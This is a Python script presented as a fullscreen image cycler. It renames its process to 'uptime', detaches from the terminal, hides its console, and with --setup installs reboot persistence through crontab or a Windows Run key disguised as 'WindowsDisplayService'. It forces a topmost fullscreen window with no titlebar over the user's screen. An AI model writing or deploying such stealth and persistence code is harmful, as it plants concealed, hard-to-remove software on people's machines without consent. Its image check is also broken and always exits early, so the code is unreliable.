#!/usr/bin/env python3
# uptime.py - Silent fullscreen image cycler (looks like broken corporate signage)

import os
import sys
import time
import random
import signal
import subprocess
import platform

try:
    from PIL import Image, ImageTk
    has_pil = True
except ImportError:
    has_pil = False

SCRIPT_PATH = os.path.abspath(__file__)
PID_FILE = os.path.expanduser("~/.uptime_pid")
DELAY_FILE = os.path.expanduser("~/.uptime_interval")  # milliseconds
DEFAULT_DELAY = 20000  # 20 seconds

def get_delay():
    if os.path.exists(DELAY_FILE):
        try:
            with open(DELAY_FILE) as f:
                return max(5000, int(f.read().strip()))
        except:
            pass
    return DEFAULT_DELAY

def set_process_name(name="uptime"):
    if platform.system() == "Linux":
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            libc.prctl(15, name.encode() + b"\0", 0, 0, 0)
        except:
            pass

def daemonize():
    if platform.system() != "Linux":
        return
    try:
        if os.fork(): sys.exit(0)
    except OSError:
        return
    os.setsid()
    try:
        if os.fork(): sys.exit(0)
    except OSError:
        return
    os.umask(0)
    with open("/dev/null", "r+") as devnull:
        os.dup2(devnull.fileno(), 0)
        os.dup2(devnull.fileno(), 1)
        os.dup2(devnull.fileno(), 2)

def set_persistence():
    if os.name == "posix":
        line = f"@reboot {sys.executable} \"{SCRIPT_PATH}\"\n"
        try:
            cur = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
            if line not in cur:
                subprocess.run("crontab -", shell=True, input=(cur + line).encode())
        except:
            pass
    elif os.name == "nt":
        try:
            import winreg as reg
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "WindowsDisplayService", 0, reg.REG_SZ,
                          f'"{sys.executable}" "{SCRIPT_PATH}"')
            reg.CloseKey(key)
        except:
            pass

import tkinter as tk

def run_gui():
    if not has_pil:
        sys.exit(0)  # no Pillow = nothing to show

    set_process_name("uptime")

    # kill old instance
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                os.kill(int(f.read().strip()), signal.SIGTERM)
        except:
            pass

    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.overrideredirect(True)  # no titlebar

    canvas = tk.Canvas(root, bg="black", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    img_dir = os.path.dirname(SCRIPT_PATH)
    images = [f for f in os.listdir(img_dir)
              if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp'))]

    if not images == 0:
        sys.exit(0)  # no images found

    current_photo = None

    def show_next():
        nonlocal current_photo
        path = os.path.join(img_dir, random.choice(images))
        try:
            img = Image.open(path)
            # letterbox scaling – perfect fit, no stretching
            bg = Image.new("RGB", (root.winfo_screenwidth(), root.winfo_screenheight()), "black")
            img.thumbnail((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
            x = (bg.width - img.width) // 2
            y = (bg.height - img.height) // 2
            bg.paste(img, (x, y))
            current_photo = ImageTk.PhotoImage(bg)
            canvas.create_image(root.winfo_screenwidth()//2,
                                root.winfo_screenheight()//2,
                                image=current_photo)
        except:
            pass
        root.after(get_delay(), show_next)

    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

    show_next()

    def cleanup(*_):
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", cleanup)
    root.bind("<Escape>", cleanup)
    root.mainloop()

if __name__ == "__main__":
    set_process_name("uptime")

    if "--setup" in sys.argv:
        set_persistence()
        print("Persistence installed")
        sys.exit(0)

    if "--terminal" in sys.argv or not has_pil:
        while True:
            time.sleep(86400)  # silent background mode

    if platform.system() == "Linux":
        daemonize()

    if os.name == "nt" and not sys.executable.endswith("pythonw.exe"):
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if os.path.exists(pythonw):
            os.execv(pythonw, [pythonw] + sys.argv)

    run_gui()
